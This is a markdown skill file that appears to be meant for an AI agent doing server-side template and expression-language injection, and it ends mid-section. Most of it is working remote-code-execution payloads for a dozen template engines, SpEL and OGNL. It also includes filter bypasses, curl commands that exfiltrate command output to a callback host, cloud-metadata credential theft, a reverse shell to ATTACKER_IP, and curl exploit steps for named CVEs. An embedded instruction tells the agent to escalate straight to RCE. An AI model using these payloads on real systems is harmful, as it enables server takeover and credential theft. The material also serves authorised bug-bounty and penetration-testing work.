---
name: ssti-hunter
description: An SSTI detection, fingerprinting, and exploitation engine. Triggered by suspected server-side evaluation (e.g., {{7*7}} = 49) or stack traces referencing a template engine (Jinja2, Twig, FreeMarker, etc.). Facilitates blind detection, sandbox escapes, and escalation to RCE. Includes report structuring (severity, CWE, remediation).
license: MIT
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["ssti", "rce", "injection", "template", "web"]
---

# SSTI Hunter — Server-Side Template Injection

SSTI occurs when user input is embedded directly into a template and evaluated by the engine. The result is almost always **Remote Code Execution** on the server.

---

## Phase 1 — Find Injection Points

| Surface | Example |
|---|---|
| URL query parameters | `/search?q=Hello` |
| URL path segments | `/greet/John` |
| HTTP headers | `User-Agent`, `Referer`, custom headers |
| Form inputs / POST body | Name, email, message fields |
| Cookies | `username=John`, theme/locale cookies |
| File names | Upload endpoints echoing the original filename |
| Email templates | Name field in password reset emails |
| Profile fields | Display name, bio, job title |

Confirm reflection first: submit a canary string (e.g. `SSTI_TEST_1337`) and verify it appears in the response before probing.

---

## Phase 2 — Detect: Is It Vulnerable?

Send each probe — look for the **evaluated result**, not the literal string:

```
{{7*7}}          → 49
${7*7}           → 49
<%= 7*7 %>       → 49
#{7*7}           → 49
*{7*7}           → 49
{{7*'7'}}        → 49 or 7777777  (engine-differentiating)
```

- **Evaluated result** → confirmed SSTI
- **Literal string reflected** → not injectable (or filtered)
- **500 error** → still injectable; note the stack trace — it usually names the engine

Error-trigger probes:
```
{{          → Jinja2/Twig unclosed tag
${          → FreeMarker/Velocity/Mako unclosed expression
<#assign x= → FreeMarker syntax error
@{1+1}      → Thymeleaf expression error
```

---

## Phase 3 — Fingerprint: Which Engine?

```
Start: submit {{7*7}}
│
├─ Returns 49
│   ├─ {{7*'7'}} → 7777777   →  Jinja2  (Python)
│   ├─ {{7*'7'}} → 49        →  Twig    (PHP)
│   └─ {{dump(1)}} returns   →  Smarty  (PHP) — also try {7*7}
│
├─ {{ fails but ${7*7} → 49
│   ├─ Java stack trace
│   │   ├─ "FreeMarker"      →  FreeMarker (Java)
│   │   ├─ "Velocity"        →  Velocity   (Java)
│   │   ├─ "Pebble"          →  Pebble     (Java)
│   │   └─ "Thymeleaf"       →  Thymeleaf  (Java) — also try *{7*7}
│   └─ Python stack trace    →  Mako (Python)
│
├─ <%= 7*7 %> → 49
│   ├─ Ruby headers/trace    →  ERB   (Ruby)
│   └─ Node headers/trace    →  EJS   (Node.js)
│
├─ #{7*7} → 49               →  Pug   (Node.js) or Smarty (PHP)
│
└─ *{7*7} or [[${7*7}]] → 49 →  Thymeleaf (Java / Spring)
```

### Engine Reference

| Engine | Language | Framework | Delimiters |
|---|---|---|---|
| Jinja2 | Python | Flask, Django, Ansible | `{{ }}` `{% %}` |
| Twig | PHP | Symfony, WordPress | `{{ }}` `{% %}` |
| Smarty | PHP | Legacy PHP | `{ }` |
| Mako | Python | Pyramid | `${ }` `<% %>` |
| FreeMarker | Java | Spring MVC | `${ }` `<#...>` |
| Velocity | Java | JIRA, Confluence | `$var` `#set` |
| Pebble | Java | Spring | `{{ }}` `{% %}` |
| Thymeleaf | Java | Spring Boot | `*{ }` `[[ ]]` |
| ERB | Ruby | Rails | `<%= %>` `<% %>` |
| EJS | JavaScript | Express | `<%= %>` `<% %>` |
| Pug/Jade | JavaScript | Express | `#{ }` `- code` |
| Handlebars | JavaScript | Express | `{{ }}` |
| Nunjucks | JavaScript | Express | `{{ }}` `{% %}` |

---

## Phase 4 — Exploitation per Engine

Confirmation payloads are in Phase 2/3. Jump straight to RCE.

---

### 4.1 Jinja2 (Python — Flask / Django / Ansible)

```python
# RCE via globals (simplest)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Flask global shortcuts
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via request (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Find Popen dynamically (when index is unknown)
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in cls.__name__ %}
    {{cls(['id'],stdout=-1).communicate()[0].decode()}}
  {% endif %}
{% endfor %}

# File read
{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

---

### 4.2 Twig (PHP — Symfony / WordPress / Craft CMS)

```php
# RCE via filter callback (Twig < 1.20)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE via map/filter (Twig 1.x)
{{["id"]|map("system")|join}}
{{['id']|filter('system')}}
{{[1,2]|sort((a,b)=>system('id'))}}

# File read
{{source('/etc/passwd')}}

# Twig 2.x / 3.x (hardened — abuse attribute function)
{{attribute(loop.body,'include',{template:'/etc/passwd'})}}
```

---

### 4.3 Smarty (PHP — legacy apps)

```php
# RCE — php tag enabled (Smarty 2.x / 3.x)
{php}echo `id`;{/php}

# RCE — static method call
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# RCE — php tag disabled (Smarty 3+)
{math equation="0" format="%1\$s" a=system('id')}
{assign var=a value='id'}{if system($a)}{/if}
```

---

### 4.4 Mako (Python — Pyramid / standalone)

```python
# Expression block
${__import__('os').popen('id').read()}

# Code block
<%
import os
x = os.popen('id').read()
%>
${x}

# Module-level block
<%!
import os
%>
${os.popen('id').read()}
```

---

### 4.5 FreeMarker (Java — Spring MVC / standalone)

```java
# RCE via Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# RCE via API access (FreeMarker 2.3.22+)
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign runtime=clazz?api.getRuntime()>
<#assign process=runtime?api.exec("id")>
<#assign is=process?api.inputStream>
<#assign br=["java.io.BufferedReader"]?new(["java.io.InputStreamReader"]?new(is))>
${br?api.readLine()}

# File read
<#assign file=["java.io.File"]?new("/etc/passwd")>
<#assign scanner=["java.util.Scanner"]?new(file)>
${scanner.useDelimiter("\\Z").next()}

# Square bracket syntax (alternate delimiters)
[#assign ex="freemarker.template.utility.Execute"?new()][=ex("id")]
```

---

### 4.6 Velocity (Java — JIRA / Confluence / legacy)

```java
# RCE via ClassTool
#set($runtime=$class.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
#set($reader=new java.io.BufferedReader(new java.io.InputStreamReader($process.getInputStream())))
$reader.readLine()

# RCE via VelocityView (VelocityTools)
#set($x=$request.class.forName("java.lang.Runtime"))
#set($rt=$x.getMethod("getRuntime",$x.forName("java.lang.Class")[0]).invoke(null,null))
#set($p=$rt.exec("id"))
#set($reader=new java.io.BufferedReader(new java.io.InputStreamReader($p.inputStream)))
$reader.readLine()
```

---

### 4.7 Pebble (Java — Spring / standalone)

```java
{% set rt = "".__class__.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null) %}
{% set cmd = rt.exec("id") %}
{% set is = cmd.inputStream %}
{% set isr = "".__class__.forName("java.io.InputStreamReader").__constructor__(is).newInstance(is) %}
{% set br = "".__class__.forName("java.io.BufferedReader").__constructor__(isr).newInstance(isr) %}
{{ br.readLine() }}
```

---

### 4.8 Thymeleaf (Java — Spring Boot)

Thymeleaf SSTI usually appears in **Spring MVC path variables mapped to template names**: `return "user/" + userInput;`

```java
# Detect (SpEL inline expressions)
*{7*7}
[[${7*7}]]

# RCE via T() SpEL operator
*{T(java.lang.Runtime).getRuntime().exec('id')}

# RCE with output capture via ProcessBuilder
*{new java.util.Scanner(
    new java.lang.ProcessBuilder(new String[]{"id"}).start().getInputStream()
).useDelimiter("\\A").next()}

# File read
*{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter("\\A").next()}

# Environment dump
*{T(java.lang.System).getenv()}
```

---

### 4.9 ERB (Ruby — Rails)

```ruby
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

### 4.10 EJS (JavaScript — Express / Node.js)

```javascript
<%= require('child_process').execSync('id').toString() %>
<%= require('fs').readFileSync('/etc/passwd','utf8') %>

// EJS options injection (when options object is user-controlled)
{"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}
```

---

### 4.11 Pug / Jade (JavaScript — Express / Node.js)

```jade
- var x = require('child_process').execSync('id').toString()
= x

- var f = require('fs').readFileSync('/etc/passwd','utf8')
= f
```

---

### 4.12 Handlebars (JavaScript — Express / standalone)

Handlebars is logic-less — RCE requires prototype pollution (< 4.7.7):

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

### 4.13 Nunjucks (JavaScript — Express / Mozilla)

```javascript
// Via constructor chain
{{"test".constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

// Via range global
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

---

## Phase 5 — Bypass Techniques

### 5.1 String Concatenation

```python
# Jinja2 — split blocked keywords
{{''.__class__['__m'+'ro__']}}
{{config['__class__']['__init__']['__glob'+'als__']['os']['po'+'pen']('id').read()}}
```

### 5.2 Encoding Bypasses

```
%7B%7B7*7%7D%7D          URL-encoded {{7*7}}
%257B%257B7*7%257D%257D  Double URL-encoded
&#123;&#123;7*7&#125;&#125;  HTML entities
｛｛7*7｝｝               Fullwidth braces (Unicode normalization)
```

### 5.3 Alternate Attribute Access (Jinja2)

```python
obj.attr         →  obj['attr']  or  obj|attr('attr')
''.__class__     →  ''['\x5f\x5fclass\x5f\x5f']
# Full encoded bypass (Flask)
{{request|attr('\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### 5.4 Comment Injection

```
# Break naive "{{" WAF detection
{{7{#comment#}*7}}
{{- 7*7 -}}

# FreeMarker square bracket alternate syntax
[=7*7]
[#assign ex="freemarker.template.utility.Execute"?new()][=ex("id")]
```

---

## Phase 6 — Blind SSTI

When output is not reflected (email, PDF, background job):

### Time-Based

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
# ERB
<%= `sleep 5` %>
# EJS
<%= require('child_process').execSync('sleep 5') %>
```

### Out-of-Band (Burp Collaborator / interactsh)

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('curl http://OOB.URL/?x=$(id|base64)').read()}}
# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://OOB.URL/?x=$(id|base64)")}
# ERB
<%= `curl http://OOB.URL/?x=$(id|base64)` %>
# EJS
<%= require('child_process').execSync('curl http://OOB.URL/?x=$(id|base64)') %>
```

---

## Phase 7 — Escalate Impact

### Sensitive Files

```
/etc/passwd
/etc/shadow               (root only)
/proc/self/environ        (env vars — secrets, API keys)
~/.ssh/id_rsa             (SSH private key)
.env                      (DB creds, API keys)
config/database.yml       (Rails DB credentials)
/app/settings.py          (Django SECRET_KEY, DB)
/var/www/html/wp-config.php
```

### Cloud Metadata (SSRF via RCE)

```bash
# AWS IAM credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# GCP token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Phase 8 — Confirm the Finding

- [ ] Math expression evaluated server-side (not reflected as-is)
- [ ] Engine identified from decision tree
- [ ] RCE payload returned `id`/`whoami` output — OR — blind confirmed via time delay / OOB
- [ ] Reproducible in a fresh session with attacker's own credentials

**False positive checks:**
- `{{7*7}}` displayed literally → not SSTI (template may sanitize or escape output)
- `{{7*7}}` evaluated in the browser → client-side injection (AngularJS), not SSTI

---

## Phase 9 — Report Structure

```
Title: SSTI in [parameter] on [endpoint] — RCE via [Engine Name]

Severity: Critical
CWE: CWE-94 | OWASP: A03:2021 – Injection

Affected endpoint: [METHOD] [URL]
Affected parameter: [name]
Template engine: [Engine + Language]

Steps to reproduce:
1. Send: [exact HTTP request with payload]
2. Observe: response contains [evaluated output]
3. Escalated PoC: [RCE payload] → output: [id command result / OOB callback]

Impact:
- RCE as [process user]
- Full compromise of application secrets and credentials
- Lateral movement to internal network / cloud metadata

Evidence:
- Request / Response snippet showing evaluation
- OOB callback log (for blind SSTI)

Remediation:
- Never render user input as a template string
  UNSAFE: render(user_input)
  SAFE:   render("Hello {{ name }}", {"name": user_input})
- Jinja2: use SandboxedEnvironment
- Twig: enable sandbox extension
- FreeMarker: set TemplateClassResolver.SAFER_RESOLVER
- Input validation alone is insufficient — template syntax is too varied
```

---

## Quick-Reference: Priority Order

1. URL query parameters — fastest, most common
2. Error pages that reflect input — stack trace names the engine
3. Template/theme selection params — `?template=`, `?theme=`, `?lang=`
4. Name/display fields — often rendered in emails or PDFs (blind)
5. Admin / CMS template editors — high privilege, maximum impact

---

## Reference Files

- `references/payloads.md` — Per-engine payload cheatsheet
- `references/tools.md` — tplmap, SSTImap, Burp extensions, Nuclei


---

## From hack-skills: SSTI Advanced Techniques

### Engine Disambiguation

```
{{7*'7'}} → "7777777" = Jinja2  |  "49" = Twig
${7*7}    → "49" = FreeMarker/Velocity/EL  |  "${7*7}" literal = not evaluated
#{7*7}    → "49" = ERB  |  literal = not ERB
@{7*7}    → "49" = Thymeleaf SpEL  |  literal = not Thymeleaf
```

### Engine → Language Mapping

| Template Engine | Language | Key Indicator |
|---|---|---|
| Jinja2 | Python (Flask) | `{{7*'7'}}` = 7777777 |
| Django | Python | `{% debug %}` shows context |
| Mako | Python | `${7*7}` works |
| Twig | PHP | `{{7*'7'}}` = 49 |
| Smarty | PHP | `{$smarty.version}` |
| FreeMarker | Java | `${7*7}` works |
| Velocity | Java | `#set($x=7*7)$x` |
| Pebble | Java | `{{ 7*7 }}` works |
| Thymeleaf | Java | `[[${7*7}]]` works |
| ERB | Ruby | `<%= 7*7 %>` |
| Slim/Haml | Ruby | `= 7*7` |
| Jade/Pug | Node.js | `= 7*7` |
| Handlebars | Node.js | `{{7*7}}` returns literal (not eval) |
| Tornado | Python | `{{ 7*7 }}` works |

### Jinja2 RCE Chains

```python
# Chain 1: direct config globals
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Chain 2: MRO subclass traversal (class index varies by app)
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
# Find correct index: {{''.__class__.__mro__[1].__subclasses__()}}

# Chain 3: request object globals with hex encoding
{{request.__class__.__init__.__globals__['\x6f\x73'].popen('id').read()}}

# Chain 4: lipsum globals
{{lipsum.__globals__.os.popen('id').read()}}

# Chain 5: cycler globals
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Jinja2 Sandbox Bypasses

```python
# Underscore blocked → use attr() with hex encoding:
{{request|attr('\x5f\x5fclass\x5f\x5f')}}

# Dot access blocked → use [] notation:
{{request['__class__']}}

# Keywords blocked → hex in attr():
{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')[1]|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

### Flask PIN Calculation (console access)

Requires all of these from server:
1. Username running Flask process (e.g., from `/proc/self/environ` or `/etc/passwd`)
2. Module name: `flask.app`
3. App path: absolute path to `app.py` (from error page or `/proc/self/cmdline`)
4. MAC address in decimal (from `/sys/class/net/eth0/address` → convert to int)
5. Machine-id (from `/etc/machine-id` or `/proc/sys/kernel/random/boot_id`)

Then compute PIN using the Flask source algorithm (varies by Flask version — search `get_pin_and_cookie_name` in Flask source).

### Other Engine Payloads

```
# FreeMarker:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Twig 1.x:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x:
{{['id']|map('system')|join}}

# Velocity:
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
#set($cmd=$rt.exec("id"))

# ERB:
<%= system('id') %>
<%= `id` %>

# Thymeleaf:
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

# AngularJS CSTI (client-side):
{{constructor.constructor('alert(1)')()}}

# Universal probe:
${{<%[%'"}}%\.
```


---

## hunt-ssti — Hunting Methodology (real BB reports)

## Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.



---

## expression-language-injection

# SKILL: Expression Language Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: EL injection achieves full RCE when user-controlled input reaches an expression language evaluator (SpEL, OGNL, Java EL). Critical CVEs include Spring Cloud Gateway (CVE-2022-22947), Confluence (CVE-2021-26084), and Struts2 (multiple). Base models often suggest SpEL payloads without accounting for security manager restrictions or the difference between SpEL, OGNL, and Java EL.

## 0. RELATED ROUTING

- ssti-hunter — if the template engine (Thymeleaf, FreeMarker) evaluates EL expressions
- rce — for general RCE vectors
- deserialization — Java deserialization often co-occurs with EL injection in app servers

---

## 1. EL TYPES QUICK REFERENCE

| EL Type | Framework | Context | Sandboxed? |
|---|---|---|---|
| SpEL | Spring Framework | @Value, SpEL templates, SpEL-based access control | Yes (by policy) |
| OGNL | Apache Struts2, MyBatis | Action parameters, value stack expressions | Yes (SecurityMember via _memberAccess) |
| Java EL (JSP EL) | JSP/Servlet | JSP pages, EL expressions ${...} | Restricted (no method calls by default) |
| MVEL | JBoss/Drools | Rule evaluation | No sandbox |
| JEXL | Apache | Custom expression contexts | Varies |

---

## 2. SPEL INJECTION

### Common Injection Sinks

- `@Value("#{userInput}")` in Spring beans
- `ExpressionParser.parseExpression(userInput)`
- Spring Security SpEL expressions (hasRole, etc.)
- Spring Data JPA `@Query` with SpEL
- Thymeleaf `th:` attributes that evaluate SpEL

### SpEL Probe Payloads

```
# Check if SpEL is evaluating:
#{7*7}          → should return 49
${7*7}          → Java EL syntax
T(java.lang.Runtime)  → SpEL class access
```

### SpEL RCE Payload

```java
// Direct Runtime.exec via T() operator:
T(java.lang.Runtime).getRuntime().exec('id')

// With output capture:
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()

// ProcessBuilder for complex commands:
new java.lang.ProcessBuilder(new String[]{'bash','-c','id'}).start()

// URL-safe variant:
T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})
```

### Spring Security SpEL Bypass

```
# hasRole check bypassed via SpEL math/string tricks:
# Target: hasRole('ADMIN')
# Injection: ' or T(java.lang.Runtime).getRuntime().exec('id') eq '
```

---

## 3. CVE-2022-22947: SPRING CLOUD GATEWAY SPEL RCE

**Affected**: Spring Cloud Gateway < 3.1.1, < 3.0.7
**Severity**: CVSS 10.0
**Vector**: Actuator endpoint allows adding new routes with SpEL filter expressions

### Exploitation

```bash
# Step 1: Add malicious route via /actuator/gateway/routes
curl -X POST http://target:9000/actuator/gateway/routes/evil \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "evil",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()}"
      }
    }],
    "uri": "http://httpbin.org",
    "predicates": [{"name": "Path", "args": {"_genkey_0": "/evil"}}]
  }'

# Step 2: Refresh routes
curl -X POST http://target:9000/actuator/gateway/refresh

# Step 3: Trigger the route and read result header
curl -v http://target:9000/evil
# Result header contains RCE output
```

---

## 4. OGNL INJECTION (APACHE STRUTS2)

### OGNL Context and Security Member

Struts2 wraps all OGNL evaluation with a security context. `_memberAccess` controls accessible class members.

Classic bypass (pre-2017):
```java
// Set _memberAccess to allow all
#_memberAccess["allowStaticMethodAccess"]=true,
@java.lang.Runtime@getRuntime().exec("id")
```

Modern Struts2 (after security hardening):
```java
// Use OgnlContext workaround
#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),
@java.lang.Runtime@getRuntime().exec("id")
```

### OGNL RCE Payload (Struts2)

```
%{(#_memberAccess['allowStaticMethodAccess']=true)(#a=@java.lang.Runtime@getRuntime().exec('id'))(#b=new java.io.InputStreamReader(#a.getInputStream()))(#c=new java.io.BufferedReader(#b))(#d=#c.readLine())(#e=@org.apache.struts2.ServletActionContext@getResponse().getWriter())(#e.println(#d))(#e.flush())(#e.close())}
```

### CVE-2021-26084: Confluence OGNL Injection

**Affected**: Confluence Server and Data Center
**Vector**: WebWork OGNL injection via `querystring` parameter

```bash
# Probe:
curl -X POST "https://confluence.target.com/pages/resumedraft.action?draftId=0" \
  --data-urlencode "querystring=%24%7B7%2A7%7D"
# If 49 appears in response → OGNL evaluating

# RCE:
curl -X POST "https://confluence.target.com/pages/resumedraft.action?draftId=0" \
  --data-urlencode 'querystring=${Runtime.exec("id")}'
```

**CVE-2021-26084 PoC tooling**: `nuclei -t cves/2021/CVE-2021-26084.yaml`

---

## 5. JAVA EL INJECTION (JSP EL)

Standard JSP EL (`${...}`) is restricted by default — no method calls, no class loading. But some applications use EL in unsafe contexts.

### Vulnerable Pattern

```java
// Server-side: render user input as EL expression
String template = "<p>" + userInput + "</p>";
// If evaluated with ExpressionFactory, ${7*7} → 49
```

### Java EL Probe

```
${7*7}
${applicationScope}
${pageContext.request.serverInfo}
```

### Unrestricted EL RCE (when ClassLoader accessible)

```
${"".class.forName("java.lang.Runtime").getMethod("exec","".class.forName("java.lang.String")).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 6. MVEL INJECTION

MVEL (JBoss Rules, Red Hat Decision Manager) has no sandbox:

```java
// Direct class instantiation
Runtime.exec("id")
new java.lang.ProcessBuilder(new String[]{"id"}).start()

// Via reflection
Class.forName("java.lang.Runtime").getMethod("exec", Class.forName("java.lang.String")).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), "id")
```

---

## 7. DETECTION & IDENTIFICATION

### Probe Payloads (Safe)

```
# Mathematical — look for evaluated result vs literal string in response
#{7*7}      → 49? (SpEL)
${7*7}      → 49? (Java EL / JEXL)
%{7*7}      → 49? (OGNL / Struts2)
${7*7}      → 49? (Thymeleaf)
[[7*7]]     → 49? (Thymeleaf inline)

# Property access — look for class name or hash in error:
#{user.class}
${applicationScope.getClass()}
%{#request}
```

### Error-Based Detection

EL errors often leak framework information:
```
Input: ${undefined_var}
Error: "PropertyNotFoundException: undefined_var"  → Java EL
Error: "ExpressionParseException"  → SpEL
Error: "OGNL not found: undefined_var"  → OGNL
```

---

## 8. EXPLOITATION DECISION TREE

```
EL-like behavior detected?
├── Identify EL type:
│   ├── #{...} with Spring → SpEL
│   ├── %{...} with Struts2 → OGNL
│   ├── ${...} in JSP/JSTL → Java EL
│   └── ${...} in JBoss/Drools → MVEL
│
├── SpEL?
│   ├── T(java.lang.Runtime).getRuntime().exec('cmd')
│   ├── New ProcessBuilder(['bash','-c','cmd']).start()
│   └── Check CVE-2022-22947 (Spring Cloud Gateway)
│
├── OGNL?
